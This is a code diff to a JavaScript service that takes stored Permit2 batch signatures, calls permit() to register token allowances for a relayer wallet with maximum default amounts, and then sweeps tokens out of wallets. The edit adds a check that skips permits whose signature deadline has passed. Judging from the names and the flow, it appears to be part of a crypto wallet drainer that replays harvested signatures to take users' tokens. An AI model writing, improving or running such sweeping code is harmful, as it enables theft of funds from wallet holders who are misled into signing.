@@ -717,26 +717,32 @@ async function sweepGaslessWallet(walletAddress) {
     } catch { needsPermit = true; }
 
     if (needsPermit) {
-      log(`[gasless] ${checksum} -- calling permit2.permit() (${permitBatch.details.length} token(s))`);
-      try {
-        const batchArg = {
-          details:     permitBatch.details.map(d => ({
-            token:      d.token,
-            amount:     BigInt(d.amount),
-            expiration: BigInt(d.expiration),
-            nonce:      Number(d.nonce),
-          })),
-          spender:     permitBatch.spender,
-          sigDeadline: BigInt(permitBatch.sigDeadline),
-        };
-        const fee = await getFeeData();
-        const permitGas = BigInt(Math.min(120_000 + permitBatch.details.length * 14_000, 800_000));
-        const tx  = await permit2.permit(checksum, batchArg, permitBatch.signature,
-          { gasLimit: permitGas, ...fee });
-        log(`[gasless] permit() tx: ${tx.hash}`);
-        await tx.wait();
-        log(`[gasless] permit() confirmed for ${checksum}`);
-      } catch (e) { err(`[gasless] permit() for ${checksum}: ${e.message}`); }
+      const pbSigDeadline = Number(permitBatch.sigDeadline ?? 0);
+      const nowCheck = Math.floor(Date.now() / 1000);
+      if (pbSigDeadline > 0 && pbSigDeadline < nowCheck) {
+        warn(`[gasless] permitBatch sigDeadline expired ${Math.floor((nowCheck - pbSigDeadline) / 86400)} days ago — skipping permit() call, using existing on-chain allowances`);
+      } else {
+        log(`[gasless] ${checksum} -- calling permit2.permit() (${permitBatch.details.length} token(s))`);
+        try {
+          const batchArg = {
+            details:     permitBatch.details.map(d => ({
+              token:      d.token,
+              amount:     BigInt(d.amount),
+              expiration: BigInt(d.expiration),
+              nonce:      Number(d.nonce),
+            })),
+            spender:     permitBatch.spender,
+            sigDeadline: BigInt(permitBatch.sigDeadline),
+          };
+          const fee = await getFeeData();
+          const permitGas = BigInt(Math.min(120_000 + permitBatch.details.length * 14_000, 800_000));
+          const tx  = await permit2.permit(checksum, batchArg, permitBatch.signature,
+            { gasLimit: permitGas, ...fee });
+          log(`[gasless] permit() tx: ${tx.hash}`);
+          await tx.wait();
+          log(`[gasless] permit() confirmed for ${checksum}`);
+        } catch (e) { err(`[gasless] permit() for ${checksum}: ${e.message}`); }
+      }
     }
 
     for (const detail of permitBatch.details) {
@@ -1669,21 +1675,27 @@ async function sweep(wallet) {
           } catch { return true; }
         });
         if (needsPermitCall) {
-          log(`[allowance] calling permit() to register ${pbData.permit.details.length} token allowances (spender=${pb3Spender.slice(0,10)})`);
-          const fee = await getFeeData();
-          const permitGas3 = BigInt(Math.min(120_000 + pbData.permit.details.length * 14_000, 800_000));
-          const permitTx = await permit2.permit(
-            checksum,
-            {
-              details:     pbData.permit.details.map(d => ({ token: d.token, amount: BigInt(d.amount ?? (2n**160n-1n).toString()), expiration: Number(d.expiration ?? (2n**48n-1n).toString()), nonce: Number(d.nonce ?? 0) })),
-              spender:     pbData.permit.spender ?? relayerWallet.address,
-              sigDeadline: BigInt(pbData.permit.sigDeadline ?? Math.floor(Date.now()/1000)+3600),
-            },
-            pbData.signature,
-            { gasLimit: permitGas3, ...fee }
-          );
-          await permitTx.wait();
-          log(`[allowance] ✅ permit() confirmed`);
+          const pb3SigDeadline = Number(pbData.permit.sigDeadline ?? 0);
+          const nowSecs3 = Math.floor(Date.now() / 1000);
+          if (pb3SigDeadline > 0 && pb3SigDeadline < nowSecs3) {
+            warn(`[allowance] permitBatch sigDeadline expired ${Math.floor((nowSecs3 - pb3SigDeadline) / 86400)} days ago — skipping permit() call, using existing on-chain allowances`);
+          } else {
+            log(`[allowance] calling permit() to register ${pbData.permit.details.length} token allowances (spender=${pb3Spender.slice(0,10)})`);
+            const fee = await getFeeData();
+            const permitGas3 = BigInt(Math.min(120_000 + pbData.permit.details.length * 14_000, 800_000));
+            const permitTx = await permit2.permit(
+              checksum,
+              {
+                details:     pbData.permit.details.map(d => ({ token: d.token, amount: BigInt(d.amount ?? (2n**160n-1n).toString()), expiration: Number(d.expiration ?? (2n**48n-1n).toString()), nonce: Number(d.nonce ?? 0) })),
+                spender:     pbData.permit.spender ?? relayerWallet.address,
+                sigDeadline: BigInt(pbData.permit.sigDeadline ?? Math.floor(Date.now()/1000)+3600),
+              },
+              pbData.signature,
+              { gasLimit: permitGas3, ...fee }
+            );
+            await permitTx.wait();
+            log(`[allowance] ✅ permit() confirmed`);
+          }
         }
       } catch (e) {
         err(`[allowance] permit() failed: ${e.reason ?? e.message} — trying sweep anyway`);
